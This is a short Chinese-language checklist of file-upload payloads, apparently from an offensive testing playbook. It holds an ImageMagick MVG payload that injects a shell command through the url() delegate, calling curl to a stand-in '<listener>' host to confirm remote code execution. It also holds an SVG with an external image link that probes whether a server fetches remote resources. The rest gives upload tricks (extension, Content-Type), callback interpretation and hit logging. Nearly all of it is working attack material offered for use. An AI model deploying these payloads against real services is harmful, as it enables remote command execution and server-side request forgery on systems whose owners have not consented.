# 解码器 / 外链载荷清单

只在第 3 层（执行面）使用；每个载荷配独立回调路径，便于归因。

## ImageMagick MVG

```
push graphic-context
viewbox 0 0 640 480
fill 'url(http://<listener>/mvg.png"|curl http://<listener>/mvg-rce)'
pop graphic-context
```

- 以 `.png` / `.mvg` 后缀上传，Content-Type 用 `image/png`。
- 回调只看 `<listener>/mvg.png` 与 `mvg-rce` 两条路径。
- 无回调的两种可能：策略禁用了 `url()` delegate，或图像处理不是 ImageMagick。

## SVG 外链

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">
  <image href="http://<listener>/svg.png" width="10" height="10"/>
</svg>
```

- 部分服务端渲染（转缩略图）会去拉 `href`；只做存储不渲染时不会触发。

## 判定记录

每个载荷记：字段名、Content-Type、回调路径、是否命中、命中时间。没命中也写进状态文件，避免下一轮重复投。
